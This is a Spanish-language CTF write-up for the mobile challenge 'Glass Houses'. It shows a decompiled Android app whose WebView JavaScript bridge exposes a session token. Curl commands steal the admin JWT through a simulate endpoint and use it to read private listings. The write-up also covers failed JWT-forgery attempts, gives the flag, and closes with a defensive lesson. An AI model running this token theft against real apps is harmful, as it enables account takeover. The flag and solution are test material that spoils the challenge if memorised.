# Glass Houses — Write-up

- **CTF:** FluidAttacks CTF 2026
- **Categoría:** Mobile · **Dificultad:** Medium
- **Flag:** `flag{5dd1a02296152122}`

## Enunciado

> FluidRealty sells houses through a slick Android app (v3.7.2), backed by a live API
> full of property listings. Some listings are more private than others.

Se entrega la fuente Java decompilada de la app (dentro de un ZIP WinZip-AES cuya
contraseña es `infected`, crackeable con PBKDF2 contra rockyou).

## 1. Recon de la app

La app `com.fluidrealty.app` habla con una API. De `ApiService.java`:

```
GET /api/properties            -> listado público
GET /api/properties?city=<X>   -> filtro por ciudad
GET /api/properties/admin      -> requiere Authorization: Bearer <token>  (listados privados)
```

La flag está en los listados privados de `/api/properties/admin`, que necesita un token.
`TokenManager` **no** contiene ningún token hardcodeado, así que no hay credencial que
extraer del APK.

En `WebViewActivity.java` aparece el punto débil: un WebView inseguro.

```java
settings.setJavaScriptEnabled(true);
webView.addJavascriptInterface(new AndroidBridge(this), "AndroidBridge");
// carga URLs arbitrarias que llegan por el deep link fluidrealty://view?url=<url>
```

Y `AndroidBridge` expone a JavaScript un método que devuelve el token de sesión:

```java
@JavascriptInterface
public String getAuthToken() {
    return TokenManager.getInstance(context).getCurrentToken();
}
```

## 2. Descubrir los endpoints ocultos

Consultando la raíz del API se listan endpoints que **no** aparecen en la fuente
decompilada:

```
GET /  ->  /api/properties, /api/properties/admin,
           /api/deeplink/process, /api/webview/simulate
```

`/api/webview/simulate` ejecuta JavaScript arbitrario en el contexto del WebView, donde
`AndroidBridge` está disponible. Es la representación server-side de la vulnerabilidad
del cliente.

## 3. Explotación: robar el token por el JS bridge

```bash
curl -s -X POST https://<target>/api/webview/simulate \
  -H 'Content-Type: application/json' \
  -d '{"javascript":"AndroidBridge.getAuthToken()"}'
```

Respuesta (el JWT del admin, rol `property_manager`):

```json
{"execution":{"method":"getAuthToken","result":"eyJhbGciOiAiSFMyNTYi...","success":true}}
```

Con ese token, se accede a los listados privados:

```bash
curl -s https://<target>/api/properties/admin \
  -H "Authorization: Bearer <TOKEN_ROBADO>"
```

```json
{"flag":"flag{5dd1a02296152122}","message":"Access granted to classified listings", ...}
```

## Callejones sin salida

- El `/api/properties` público solo devuelve propiedades no privadas; ningún parámetro
  (`include_private`, `private`, `city=...`, `status=...`) revela las clasificadas.
- El endpoint `/admin` distingue 401 (sin token) de 403 (token inválido), pero
  `alg=none` y secretos HS256 comunes fallan: la vía **no** era forjar el JWT.

## Lección

Un `WebView` con `setJavaScriptEnabled(true)` + `addJavascriptInterface(...)` que carga
URLs no confiables (aquí vía un deep link exportado) permite que cualquier página robe lo
que el bridge exponga. Nunca expongas tokens/credenciales por un `@JavascriptInterface`
si el WebView puede cargar contenido controlado por un atacante.
